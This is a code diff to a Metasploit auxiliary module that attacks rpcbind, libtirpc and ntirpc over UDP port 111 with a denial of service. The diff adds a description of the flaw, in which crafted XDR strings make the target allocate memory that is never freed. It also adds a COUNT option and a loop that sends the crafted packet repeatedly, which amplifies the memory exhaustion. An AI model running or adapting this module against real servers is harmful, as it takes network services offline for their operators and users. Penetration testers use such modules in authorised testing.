@@ -12,7 +12,10 @@ class MetasploitModule < Msf::Auxiliary
     super(update_info(info,
       'Name'        => 'RPC DoS targeting *nix rpcbind/libtirpc',
       'Description' => %q{
-        This module XXX.
+        This module exploits a vulnerability in certain versions of
+        rpcbind, LIBTIRPC, and NTIRPC, allowing an attacker to trigger
+        large (and never freed) memory allocations for XDR strings on
+        the target.
       },
       'Author'  =>
         [
@@ -30,7 +33,8 @@ class MetasploitModule < Msf::Auxiliary
     register_options([
       Opt::RPORT(111),
       OptAddress.new('RHOST', [true, 'RPC server target']),
-      OptInt.new('ALLOCSIZE', [true, 'Number of bytes to allocate'])
+      OptInt.new('ALLOCSIZE', [true, 'Number of bytes to allocate']),
+      OptInt.new('COUNT', [false, "Number of intervals to loop",1])
     ])
   end
 
@@ -56,7 +60,11 @@ class MetasploitModule < Msf::Auxiliary
     pkt << [datastore['ALLOCSIZE']].pack('N') # Payload
 
     s = UDPSocket.new
-    s.send(pkt, 0, datastore['RHOST'], datastore['RPORT'])
+    count = 0
+    while count < datastore['COUNT'] do
+      s.send(pkt, 0, datastore['RHOST'], datastore['RPORT'])
+      count += 1
+    end
 
     sleep 1.5
 
@@ -67,6 +75,6 @@ class MetasploitModule < Msf::Auxiliary
         return
     end
 
-    print_good("Allocated #{datastore['ALLOCSIZE']} bytes at host #{datastore['RHOST']}:#{datastore['RPORT']}")
+    print_good("Completed #{datastore['COUNT']} loop(s) of allocating #{datastore['ALLOCSIZE']} bytes at host #{datastore['RHOST']}:#{datastore['RPORT']}")
   end
 end
